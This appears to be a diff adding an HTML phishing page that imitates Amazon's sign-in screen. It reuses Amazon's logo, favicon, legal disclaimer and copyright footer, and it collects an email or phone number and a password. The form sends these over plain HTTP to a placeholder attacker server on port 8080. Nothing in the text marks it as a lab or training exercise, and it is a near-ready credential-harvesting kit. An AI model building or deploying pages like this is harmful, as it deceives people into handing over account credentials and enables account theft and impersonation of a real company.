@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Amazon Sign-In</title>
+  <link rel="icon" href="https://www.amazon.com/favicon.ico">
+  <style>
+    body {
+      font-family: "Arial", sans-serif;
+      background-color: #ffffff;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      margin-top: 50px;
+    }
+    .login-box {
+      width: 350px;
+      border: 1px solid #ddd;
+      padding: 20px 26px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+    }
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 103px;
+    }
+    h1 {
+      font-weight: normal;
+      font-size: 28px;
+      margin: 0 0 20px;
+    }
+    label {
+      font-weight: bold;
+      font-size: 13px;
+      display: block;
+      margin-bottom: 4px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 14px;
+      border: 1px solid #a6a6a6;
+      border-radius: 3px;
+    }
+    button {
+      background: #f0c14b;
+      border: 1px solid #a88734;
+      width: 100%;
+      padding: 8px;
+      font-size: 13px;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+    .disclaimer {
+      font-size: 12px;
+      color: #555;
+      margin-top: 14px;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 50px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
+      </div>
+      <h1>Sign-In</h1>
+      <form action="http://Backend server IP goes here:8080/login" method="post">
+        <label for="email">Email or mobile phone number</label>
+        <input type="text" id="email" name="email" required />
+
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required />
+
+        <button type="submit">Sign-In</button>
+      </form>
+      <div class="disclaimer">
+        By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    © 1996-2025, Amazon.com, Inc. or its affiliates
+  </div>
+</body>
+</html>
